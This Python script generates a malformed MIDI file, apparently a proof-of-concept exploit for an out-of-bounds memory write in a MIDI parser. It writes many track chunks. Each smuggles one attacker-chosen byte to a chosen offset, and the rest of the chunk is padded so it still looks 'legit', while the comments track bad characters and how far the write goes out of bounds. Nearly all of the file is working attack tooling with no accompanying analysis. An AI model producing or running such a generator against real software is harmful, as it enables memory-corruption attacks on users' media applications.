#!/usr/bin/python3
import struct
import binascii
from dataclasses import dataclass

#Headerchunk
@dataclass
class HeaderChunk:
	#Amount of tracks, uint16
	data_tracks: int
	#Some wierd music thing, uint16
	data_division: int
	#Magicbytes
	chunk_type: str = "MThd"
	# length uint32
	length: int = 6
	#This is the midiformat it can be 0-2, uint16
	data_format: int = 1
@dataclass
class TrackChunk:
	data : str 
	# length uint32
	length: int
	chunk_type: str = "MTrk"


#Our values we wanna write to memory. 
#Badchars 0x80-0xFF
charToUse = b"\x41"

#The amount of chars to write.
amountOfChars = 0xff-0x70

#Base offset where to write those chars -> between 0x00-0xff
baseOffset = 0x70

OutputFilePath = 'test.mid'
OutputFile = open(OutputFilePath, 'wb')

headerChunk = HeaderChunk(data_tracks = amountOfChars+1, data_division = 0x78)
binHeader = headerChunk.chunk_type.encode('ascii')
binHeader += struct.pack('>I',headerChunk.length)
binHeader += struct.pack('>H',headerChunk.data_format)
binHeader += struct.pack('>H',headerChunk.data_tracks)
binHeader += struct.pack('>H',headerChunk.data_division)
OutputFile.write(binHeader)

currentChar = 0;
for i in range(baseOffset,baseOffset+amountOfChars):
	trackChunk = TrackChunk(length =  0x1c,data = b"\x00\xc0\x21\x00\xaf")
	#We can write one byte above 0x7f per TrackChunk
	firstByteOffset = struct.pack('>B',i)
	firstByteChar = struct.pack('>B',charToUse[currentChar])
	currentChar =  (currentChar+1)%len(charToUse)
	#Write first byte only one we can go out of bounds far
	trackChunk.data += firstByteOffset
	trackChunk.data += firstByteChar
	# The rest of the chunk, so our chunk is "legit" again
	trackChunk.data += b'\x08\x00\xFF\x51\x03\x07\xA1\x20\x00\xFF\x54\x05\x40\x00\x00\x00\x00\x00\xFF\x2F\x00'
	# Writing the chunk to the file
	binTrack = trackChunk.chunk_type.encode('ascii')
	binTrack += struct.pack('>I',trackChunk.length)
	binTrack += trackChunk.data
	OutputFile.write(binTrack)
OutputFile.close()